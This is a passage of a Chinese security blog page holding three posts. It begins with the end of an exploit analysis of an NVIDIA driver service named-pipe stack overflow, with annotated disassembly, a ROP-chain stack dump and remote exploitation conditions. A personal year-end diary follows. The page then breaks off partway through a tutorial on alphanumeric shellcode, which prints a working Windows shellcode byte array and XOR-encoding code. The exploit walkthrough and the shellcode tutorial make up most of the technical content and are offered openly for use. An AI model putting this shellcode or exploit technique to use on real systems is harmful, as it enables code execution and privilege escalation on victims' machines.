<span class="string">.text</span>:<span class="number">0000000000004017</span>                 <span class="keyword">mov</span>     <span class="literal">ebx</span>, [<span class="literal">rsp</span>+<span class="number">28h</span>+nNumberOfBytesToWrite] <span class="comment">; ebx=4078</span>
<span class="string">.text</span>:000000000000401B                 <span class="keyword">lea</span>     <span class="literal">r9</span>, [<span class="literal">rsp</span>+<span class="number">28h</span>+NumberOfBytesWritten] <span class="comment">; lpNumberOfBytesWritten  [lp]=4078</span>
<span class="string">.text</span>:<span class="number">0000000000004020</span>                 <span class="keyword">lea</span>     <span class="literal">rdx</span>, [<span class="literal">rbp</span>+<span class="number">4180h</span>] <span class="comment">; lpBuffer</span>
<span class="string">.text</span>:<span class="number">0000000000004027</span>                 <span class="keyword">mov</span>     <span class="literal">rcx</span>, <span class="literal">rsi</span>        <span class="comment">; hFile</span>
<span class="string">.text</span>:000000000000402A                 <span class="keyword">mov</span>     <span class="literal">r8d</span>, <span class="literal">ebx</span>        <span class="comment">; nNumberOfBytesToWrite  4078个字节  每次写入没有限制也没有任何检测</span>
<span class="string">.text</span>:<span class="number">000000000000402D</span>                 <span class="keyword">mov</span>     [<span class="literal">rsp</span>+<span class="number">28h</span>+var_8], <span class="literal">r14</span>
<span class="string">.text</span>:<span class="number">0000000000004032</span>                 <span class="keyword">call</span>    <span class="literal">cs</span>:WriteFile    <span class="comment">; 将4078个字节的数据写入管道中,导致内存泄漏</span>
<span class="string">.text</span>:<span class="number">0000000000004038</span>                 <span class="keyword">test</span>    <span class="literal">eax</span>, <span class="literal">eax</span>        <span class="comment">; 判断是否调用成功</span>
<span class="string">.text</span>:000000000000403A                 <span class="keyword">jz</span>      short loc_406F
<span class="string">.text</span>:000000000000403C                 <span class="keyword">cmp</span>     <span class="literal">ebx</span>, [<span class="literal">rsp</span>+<span class="number">28h</span>+NumberOfBytesWritten] <span class="comment">; 判断是否写入的是4078个字节</span>
<span class="string">.text</span>:<span class="number">0000000000004040</span>                 <span class="keyword">jnz</span>     short loc_406F
<span class="string">.text</span>:<span class="number">0000000000004042</span>                 <span class="keyword">lea</span>     <span class="literal">r9</span>, [<span class="literal">rsp</span>+<span class="number">28h</span>+NumberOfBytesRead] <span class="comment">; lpnNumberOfBytesToRead ---step 5  [lp]=4020h</span>
<span class="string">.text</span>:<span class="number">0000000000004047</span>                 <span class="keyword">lea</span>     <span class="literal">rdx</span>, [<span class="literal">rbp</span>+<span class="number">160h</span>] <span class="comment">; lpBuffer</span>
<span class="string">.text</span>:000000000000404E                 <span class="keyword">mov</span>     <span class="literal">r8d</span>, <span class="number">4020h</span>      <span class="comment">; nNumberOfBytesToRead  4020h 每次固定读入4020h个字节</span>
<span class="string">.text</span>:<span class="number">0000000000004054</span>                 <span class="keyword">mov</span>     <span class="literal">rcx</span>, <span class="literal">rsi</span>        <span class="comment">; hFile</span>
<span class="string">.text</span>:<span class="number">0000000000004057</span>                 <span class="keyword">mov</span>     [<span class="literal">rsp</span>+<span class="number">28h</span>+var_8], <span class="literal">r14</span>
<span class="string">.text</span>:000000000000405C                 <span class="keyword">call</span>    <span class="literal">cs</span>:ReadFile     <span class="comment">;将攻击者CLIENT发送的数据从管道读入缓冲区</span>
<span class="string">.text</span>:<span class="number">0000000000004062</span>                 <span class="keyword">mov</span>     <span class="literal">ebx</span>, <span class="number">2000h</span>
<span class="string">.text</span>:<span class="number">0000000000004067</span>                 <span class="keyword">test</span>    <span class="literal">eax</span>, <span class="literal">eax</span>
<span class="string">.text</span>:<span class="number">0000000000004069</span>                 <span class="keyword">jnz</span>     loc_3B9C        <span class="comment">; 如果读到数据则跳回前边做循环处理</span>
</code></pre><p>攻击者发送完三次数据，nvvsvc服务最后一次从管道中读取数据失败，然后去执行关闭管道句柄过程，如下：</p>
<pre><code>.text:<span class="number">000000000000406F</span>
.text:<span class="number">000000000000406F</span> loc_406F:                               ; CODE XREF: sub_3B18+<span class="number">71</span>j
.text:<span class="number">000000000000406F</span>                                         ; sub_3B18+<span class="number">89</span>j ...
.text:<span class="number">000000000000406F</span>                 mov     rcx, rsi        ; hFile
.text:<span class="number">0000000000004072</span>                 call    cs:FlushFileBuffers
.text:<span class="number">0000000000004078</span>                 mov     rcx, rsi        ; hNamedPipe
.text:<span class="number">000000000000407</span>B                 call    cs:DisconnectNamedPipe
.text:<span class="number">0000000000004081</span>                 mov     rcx, rsi        ; hObject
.text:<span class="number">0000000000004084</span>                 call    cs:CloseHandle
.text:<span class="number">000000000000408</span>A                 lock dec cs:dword_D091C
.text:<span class="number">0000000000004091</span>                 mov     eax, <span class="number">1</span>
.text:<span class="number">0000000000004096</span>                 mov     rcx, [rbp+<span class="number">81</span>A0h]
.text:<span class="number">000000000000409</span>D                 xor     rcx, rsp
.text:<span class="number">00000000000040</span>A0                 call    sub_455A0
.text:<span class="number">00000000000040</span>A5                 lea     r11, [rsp+<span class="number">28</span>h+arg_8280]
;恢复堆栈指针rsp， lea r11,[rsp+<span class="number">82</span>b0]，通过最后一步写入数据的精心布局，rsp最终将指向攻击者精心构造的数据。
.text:<span class="number">00000000000040</span>AD                 mov     rbx, [r11+<span class="number">38</span>h]
.text:<span class="number">00000000000040</span>B1                 mov     rsi, [r11+<span class="number">40</span>h]
.text:<span class="number">00000000000040</span>B5                 mov     rdi, [r11+<span class="number">48</span>h]
.text:<span class="number">00000000000040</span>B9                 mov     rsp, r11        ; 得到rsp的控制权，此时堆栈数据如下：

<span class="number">00000000</span>`<span class="number">01</span>b7fb00 <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span>  CCCCCCCC
<span class="number">00000000</span>`<span class="number">01</span>b7fb08 <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span>  CCCCCCCC
<span class="number">00000000</span>`<span class="number">01</span>b7fb10 <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span>  CCCCCCCC
<span class="number">00000000</span>`<span class="number">01</span>b7fb18 <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span>  CCCCCCCC
<span class="number">00000000</span>`<span class="number">01</span>b7fb20 <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span>  CCCCCCCC
<span class="number">00000000</span>`<span class="number">01</span>b7fb28 <span class="number">6</span>e <span class="number">5f</span> <span class="number">31</span> <span class="number">3f</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  n_1?....   <span class="comment">//rop链</span>
<span class="number">00000000</span>`<span class="number">01</span>b7fb30 <span class="number">9</span>c <span class="number">4f</span> <span class="number">35</span> <span class="number">3f</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  .O5?....
<span class="number">00000000</span>`<span class="number">01</span>b7fb38 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ........

.text:<span class="number">00000000000040</span>BC                 pop     r15
.text:<span class="number">00000000000040</span>BE                 pop     r14
.text:<span class="number">00000000000040</span>C0                 pop     r13
.text:<span class="number">00000000000040</span>C2                 pop     r12
.text:<span class="number">00000000000040</span>C4                 pop     rbp
.text:<span class="number">00000000000040</span>C5                 retn
;  经过五次pop过后rsp指向ROP链第一条语句，retn之后开始执行ROP链，最后成功跳进shellcode.
.text:<span class="number">00000000000040</span>C5 sub_3B18        endp
.text:<span class="number">00000000000040</span>C5
</code></pre><h3 id="远程利用条件">远程利用条件</h3><ul>
<li>本机（作为攻击的计算机）必须有账户名和密码，并且密码不能为空，目标机器密码可为空。</li>
<li>本机与被攻击计算机必须在同一网段</li>
<li>关闭防火墙</li>
<li>被攻击的目标计算机必须关闭密码保护共享（本机可不关闭），如下图所示：</li>
<li>如果攻击目标机器为Win2008 R2 x64系统，则本机（作为攻击计算机）的用户名中不能与目标机器具有相同的用户名。比如本机用户为test，而目标机器（Win2008中）的账户中也有个名为test的账户，则攻击不成功。对于攻击系统为Win7 x64的计算机则没有要求。</li>
</ul>
<p>Win7 x64和Win2008 R2 x64均测试成功！</p>
<h2 id="总结">总结</h2><p>经过多次试验，关键的地方就是c:\windows\system32\nvvsvc.exe这个程序，可以将这个程序拷贝到其他计算机中相同的目录下，不论是否装有N卡驱动，然后重启查看进程，确定该驱动服务后台加载了，就可以得到相同的测试结果。也就是说nvvsvc.exe这个驱动服务在启动的时候创建了一个名字为nvsr的管道，这个管道的dacl是空,也就是说everyone都可以访问。这就是该漏洞利用是否成功的关键。</p>
<p>这个漏洞要做到通用，还需要收集各种显卡的驱动程序，其实也仅仅需要收集c:\windows\system32\nvvsvc.exe这个程序，而且实际构造测试发现，有些相近版本的驱动（比如gt520m的8.17.12.8590和gt630m的8.17.12.8580）也是可以通用的。目前已经收集到10个，相应的ROP链也已经构造完成，并测试能够正确执行。</p>
<p>最后关于这个漏洞的分析，刚开始一直对这个nvvsvc.exe下断点断下来，后来原因也找到了，在进程中显示所有用户进程会发现两个nvvsvc.exe服务进程，一个可以断到，一个断不到，所以两个都需要下断点才可以。调试发现给最先加载的那个服务进程下断点就可以了。对于这个漏洞还有需要研究的地方，比如除了0x52操作，其他几个操作完成了什么样的功能，是否有可利用之处，需要有时间再跟踪调试一下。</p>
<h2 id="参考">参考</h2><p><a href="http://bbs.pediy.com/showthread.php?t=160621" target="_blank" rel="external">NVIDIA Driver Helper Service栈溢出简单说明</a><br><a href="http://bbs.pediy.com/showthread.php?t=160672" target="_blank" rel="external">Nvvsvc32.exe 溢出简要分析</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2013/01/09/exploit-nvidia-elevate-privilege/" data-id="civbwoo8m00315p6i340bf656" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2013/01/09/exploit-nvidia-elevate-privilege/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nvidia/">nvidia</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-diary-annual-summary-2012" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/01/02/diary-annual-summary-2012/" class="article-date">
  <time datetime="2013-01-01T19:09:11.000Z" itemprop="datePublished">2013-01-02</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/diary/">diary</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/01/02/diary-annual-summary-2012/">我的2012</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&#160; &#160; &#160; &#160;刚从外边回来，本来几个2B青年打算感受一下大北京的206夜班公交车，结果在风中颤抖了半个小时，由于某种不可抗拒因素，打车回来了，未能完成2013年的第一件小心愿，只有一个感受，真特么冷。本来该昨晚写的，这样就能与去年前后呼应，昨晚看完郭德纲回来太晚了加上抽了点风喝着冰镇可乐刷了半夜帖子，天亮准时睡着了，就啥事给忘了。</p>
<hr>

<p>&#160; &#160; &#160; &#160;想想时间真快，大学毕业，还没做好心理准备唰的一下就快两年了，再小唰一下研究生也毕业了，难道要读博士？开玩笑！去年这个时候我是坐在床上搭个小桌子一边码字一边找回忆一边想着明年这个时候我会时什么样子，今年，同样是坐在床上，缺少了小桌子一边码字一边找回忆一边想着今年怎么会是这个样子？去年怎么会想到真的就来北京了，真的一呆就是半年。</p>
<hr>

<p>&#160; &#160; &#160; &#160;去年过年我就在寻思着，开了学一定要抓紧把成都玩完，不然暑假实习以后就没时间了。过了年回成都，上半年确实玩了很多地方，把能去的想去的都去了。2月底去了九龙沟，3月初开春时候骑自行车去龙泉看桃花，3月底大学几个好好好朋友来成都玩，由于时间差没聚到一起，分了两波过来，前后只差几个小时，所以那几天我可是，嗯，充实！那一周去了两趟锦里，两趟宽窄巷子，两趟洛带古镇，熊猫基地和九寨沟，走了N多重复的路，跟第一波人说第二波他们怎么怎么样，跟第二波人说第一波他们怎么怎么样，我们总会有聊不完的话，开不完的玩笑，发不完的脾气，听不完的抱怨，所以，我赚了。嗯，想到你们总有写不完的东西，就此打住。4月份去了欢乐谷，5月份去了西岭雪山。6月份开始找一些实习单位也参加了一些面试，还有每晚的跑步，这个跑步，就不说了，总之6月份是一个值得回忆的小插曲。这半年期间也间断看一些专业书，其实，也没看出来什么东西。还有跟学校的一群叼丝没事打个台球，拍个篮球，吃个理工快餐，现在好怀念这些日子啊，有时候真想快点回学校，叼丝们，你们在哪里？</p>
<hr>

<p>&#160; &#160; &#160; &#160;7月中旬来了北京，来北京之前，陪宿舍那个文艺小青年耗子去买单反，当时耗子和猴哥那俩货一鼓励一忽悠外加我一激动，我也买了个相机，从小康社会瞬间回到解放前。买了去北京的火车票之后，兜里就300多块钱了，最最重要的是买不到卧铺，当我很潇洒的上了火车苦坐28个小时硬座来到了梦想中金光闪闪的大北京去了公司报道下午吃了第一顿盖浇饭花了20之后，瞬间觉得两个字，卧槽，能坚持一个月么！还好第二天公司把火车票给报了，然后发了半个月的餐补，当时内牛满面感谢党，一个月就这么过去了。这样一晃将近半年就过去了，对于像我这种以后不打算混酒场官场的人来说，这个公司确实是一个很好的平台，也学到了很多东西。虽然现在处于并将长期处于超级菜鸟级别，但现在起码不算讨厌这种工作方式，需要做的仅仅是学习学习再学习，为30岁做准备。</p>
<hr>

<p>&#160; &#160; &#160; &#160;说说北京吧，呆了半年也经历了不少，走过路过也到处玩过，丢过捡过地铁也被人盯过，当过大爷也装过孙子，扮着叼丝却始终没有逆袭过。北京是个很容易让人飘起来的城市，虽然知道这个城市的大部分建筑不是为我们建的，但是总会希望有一天可以是。人才和机遇共存的地方，给你希望又让你绝望。地下室的小单间与地上的不能侧身的小隔断，你会选择哪一个？一种怜悯一种心酸，为那些充满理想和激情的人们，表示尊敬！</p>
<hr>

<p>&#160; &#160; &#160; &#160;About the benmingnian, which gave me a big big joke, in these day , I feel no friend to say, no feelingto life ,I miss the bus ,forget for lunch, lose sleep , I feel everthing isbad. Maybe I am also luckily ,because now I am OK ! I think maybe I do some badthings in previous life,so,I will do some goodthings in The remaining days so that I could have aperfect life in next life.</p>
<hr>

<p>&#160; &#160; &#160; &#160;不知不觉又后半夜了，身体是革命的本钱，健康面前什么都是浮云，一辈子只有生死两件大事，其他都不是个事。少熬夜多运动，毕竟不是年轻的时候了，怀念大学时候的精力充沛啊。睡觉睡觉！明天养足精神准备奋战到天亮！ </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2013/01/02/diary-annual-summary-2012/" data-id="civbwooc800585p6ii3p29exy" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2013/01/02/diary-annual-summary-2012/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/无法描述/">无法描述</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-technic-alphanumeric-shellcode" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2012/12/18/technic-alphanumeric-shellcode/" class="article-date">
  <time datetime="2012-12-18T14:28:11.000Z" itemprop="datePublished">2012-12-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/technic/">technic</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2012/12/18/technic-alphanumeric-shellcode/">纯字母数字shellcode编码</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>纯字母数字shellcode编码分析与实现</p>
<h2 id="编写环境：">编写环境：</h2><p>Win7 32，vs2008</p>
<h2 id="背景介绍：">背景介绍：</h2><p>1.黑防2007年第二期中介绍了纯字母数字的Shellcode的编写，在3期中的WinRAR 7z溢出中就派上了用场。Unicode大家应该不陌生,在一些大型程序中，比如Word、Excel考虑到不同语言平台的差异性,都会使用 Unicode，在利用这些漏洞的时候，我们以往的Shellcode就难以适用了。一个普通的Down&amp;Exec的Shellcode经过 MultiByteToWideChar函数转换成Unicode后就会乱码。</p>
<p>2.可能有人认为只要先将Shellcode写好，然后用WideCharToMultiByte函数转换成ASCII码，再经过程序转换成 Unicode就可以了，但事实不是这样的，在转换成Unicode的时候，转换函数会根据当前使用的代码页进行转换,比如大写字母’A’(\x41)被转换成\x41\x00，但是第一个字节&gt;0x80或者第二个字节不是\x00的时候，情况就不是这么简单了， MultiByteToWideChar会查找代码页中的对应结果，假如找不到就会有\x3F(?)代替，表示有错误。</p>
<p>3.WideCharToMultiByte使Exploit编写难度加大了，因为不得不使用纯字符的Shellcode，这样经过AscII-&gt;Unicode-&gt;Ascii转换后的Shellcode依然能正确运行</p>
<p>4.关于纯字母数字的Shellcode，大致的思想就是将shellcode分成解码头+主体两部分，解码头是以纯字符的指令组成的，主体以某种算法拆分成两个字节。解码头取得控制权以后还原Shellcode并执行。</p>
<h2 id="实现方法">实现方法</h2><h3 id="未经过编码的shellcode">未经过编码的shellcode</h3><p>1.先找到一份Win7下通用的shellcode，因为里边含有0x00，在后边调用宽窄字符转换函数时候会截断，所以先进行一次简单的异或操作，Key=0X97，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> KEY <span class="number">0x97</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[<span class="number">219</span>] = &#123;</span><br><span class="line">	<span class="number">0xE9</span>, <span class="number">0x96</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x31</span>, <span class="number">0xC9</span>, <span class="number">0x64</span>, <span class="number">0x8B</span>, <span class="number">0x71</span>, <span class="number">0x30</span>, <span class="number">0x8B</span>, <span class="number">0x76</span>, <span class="number">0x0C</span>, <span class="number">0x8B</span>,</span><br><span class="line">	<span class="number">0x76</span>, <span class="number">0x1C</span>, <span class="number">0x8B</span>, <span class="number">0x46</span>, <span class="number">0x08</span>, <span class="number">0x8B</span>, <span class="number">0x7E</span>, <span class="number">0x20</span>, <span class="number">0x8B</span>, <span class="number">0x36</span>, <span class="number">0x66</span>, <span class="number">0x39</span>, <span class="number">0x4F</span>, <span class="number">0x18</span>, <span class="number">0x75</span>, <span class="number">0xF2</span>,</span><br><span class="line">	<span class="number">0x5E</span>, <span class="number">0xC3</span>, <span class="number">0x60</span>, <span class="number">0x8B</span>, <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x24</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x3C</span>, <span class="number">0x8B</span>, <span class="number">0x54</span>, <span class="number">0x05</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0xEA</span>,</span><br><span class="line">	<span class="number">0x8B</span>, <span class="number">0x4A</span>, <span class="number">0x18</span>, <span class="number">0x8B</span>, <span class="number">0x5A</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0xEB</span>, <span class="number">0xE3</span>, <span class="number">0x37</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x34</span>, <span class="number">0x8B</span>, <span class="number">0x01</span>, <span class="number">0xEE</span>,</span><br><span class="line">	<span class="number">0x31</span>, <span class="number">0xFF</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0xFC</span>, <span class="number">0xAC</span>, <span class="number">0x84</span>, <span class="number">0xC0</span>, <span class="number">0x74</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0xCF</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0xC7</span>, <span class="number">0xE9</span>,</span><br><span class="line">	<span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x3B</span>, <span class="number">0x7C</span>, <span class="number">0x24</span>, <span class="number">0x28</span>, <span class="number">0x75</span>, <span class="number">0xDE</span>, <span class="number">0x8B</span>, <span class="number">0x5A</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0xEB</span>, <span class="number">0x66</span>,</span><br><span class="line">	<span class="number">0x8B</span>, <span class="number">0x0C</span>, <span class="number">0x4B</span>, <span class="number">0x8B</span>, <span class="number">0x5A</span>, <span class="number">0x1C</span>, <span class="number">0x01</span></span><br><span class="line">	, <span class="number">0xEB</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x8B</span>, <span class="number">0x01</span>, <span class="number">0xE8</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>,</span><br><span class="line">	<span class="number">0x1C</span>, <span class="number">0x61</span>, <span class="number">0xC3</span>, <span class="number">0xAD</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0xE8</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x89</span>, <span class="number">0x07</span>, <span class="number">0x81</span>, <span class="number">0xC4</span>, <span class="number">0x08</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x81</span>, <span class="number">0xC7</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0xCE</span>, <span class="number">0x75</span>, <span class="number">0xE6</span>, <span class="number">0xC3</span>, <span class="number">0xE8</span>, <span class="number">0x19</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x98</span>, <span class="number">0xFE</span>, <span class="number">0x8A</span>, <span class="number">0x0E</span>, <span class="number">0x7E</span>, <span class="number">0xD8</span>, <span class="number">0xE2</span>, <span class="number">0x73</span>, <span class="number">0x81</span>, <span class="number">0xEC</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x89</span>, <span class="number">0xE5</span>, <span class="number">0xE8</span>, <span class="number">0x5D</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x89</span>, <span class="number">0xC2</span>, <span class="number">0xEB</span>, <span class="number">0xE2</span>, <span class="number">0x5E</span>, <span class="number">0x8D</span>, <span class="number">0x7D</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x89</span>, <span class="number">0xF1</span>, <span class="number">0x81</span>, <span class="number">0xC1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xE8</span>, <span class="number">0xB6</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xEB</span>, <span class="number">0x0E</span>, <span class="number">0x5B</span>,</span><br><span class="line">	<span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0xFF</span>, <span class="number">0x55</span>, <span class="number">0x04</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x50</span>, <span class="number">0xFF</span>, <span class="number">0x55</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0xED</span>, <span class="number">0xFF</span>,</span><br><span class="line">	<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x2E</span>, <span class="number">0x65</span>, <span class="number">0x78</span>, <span class="number">0x65</span>, <span class="number">0x00</span></span><br><span class="line">	&#125;;<span class="comment">//含有\x00的ShellCode</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> nLen;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> enshellcode[<span class="number">500</span>]; <span class="comment">//编码后的enShellCode</span></span><br><span class="line">	nLen = <span class="keyword">sizeof</span>(shellcode)-<span class="number">1</span>; <span class="comment">//获得ShellCode的长度</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;nLen; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		enshellcode[i] = shellcode[i] ^ KEY; <span class="comment">//对每一位ShellCode作xor key编码KEY=0x97</span></span><br><span class="line">		<span class="comment">//printf("\\x%x-",shellcode[i]); </span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\\x%x"</span>,enshellcode[i]); <span class="comment">//打印出效果</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span><br><span class="line">xor97后enshellcode:</span><br><span class="line">"\x7e\x1\x97\x97\x97\xc1\xa6\x5e\xf3\x1c\xe6\xa7\x1c\xe1\x9b\x1c\xe1\x8b\x1c\xd1"</span><br><span class="line">"\x9f\x1c\xe9\xb7\x1c\xa1\xf1\xae\xd8\x8f\xe2\x65\xc9\x54\xf7\x1c\xfb\xb3\xb3\x1c"</span><br><span class="line">"\xd2\xab\x1c\xc3\x92\xef\x96\x7d\x1c\xdd\x8f\x1c\xcd\xb7\x96\x7c\x74\xa0\xde\x1c"</span><br><span class="line">"\xa3\x1c\x96\x79\xa6\x68\xa6\x57\x6b\x3b\x13\x57\xe3\x9d\x56\x58\x9a\x96\x50\x7e"</span><br><span class="line">"\x66\x68\x68\x68\xac\xeb\xb3\xbf\xe2\x49\x1c\xcd\xb3\x96\x7c\xf1\x1c\x9b\xdc\x1c"</span><br><span class="line">"\xcd\x8b\x96\x7c\x1c\x93\x1c\x96\x7f\x1e\xd3\xb3\x8b\xf6\x54\x3a\xc7\xc5\x7f\x30"</span><br><span class="line">"\x68\x68\x68\x1e\x90\x16\x53\x9f\x97\x97\x97\x16\x50\x93\x97\x97\x97\xae\x59\xe2"</span><br><span class="line">"\x71\x54\x7f\x8e\x97\x97\x97\xf\x69\x1d\x99\xe9\x4f\x75\xe4\x16\x7b\x9f\x97\x97"</span><br><span class="line">"\x97\x1e\x72\x7f\xca\x68\x68\x68\x1e\x55\x7c\x75\xc9\x1a\xea\x93\x1e\x66\x16\x56"</span><br><span class="line">"\x9f\x97\x97\x97\x7f\x21\x68\x68\x68\x7c\x99\xcc\xa6\x57\xc7\xc4\x68\xc2\x93\xa6"</span><br><span class="line">"\x57\xc7\x68\xc2\x9f\x7f\x7a\x68\x68\x68\xf4\xf6\xfb\xf4\xb9\xf2\xef\xf2"</span><br><span class="line">*/</span></span><br></pre></td></tr></table></figure>
<p>2.然后我们将异或0x97后的enshellcode经过两次转换，最后再异或0x97，如果shellcode不变形，能够成功执行shellcode弹出计算器，源码如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 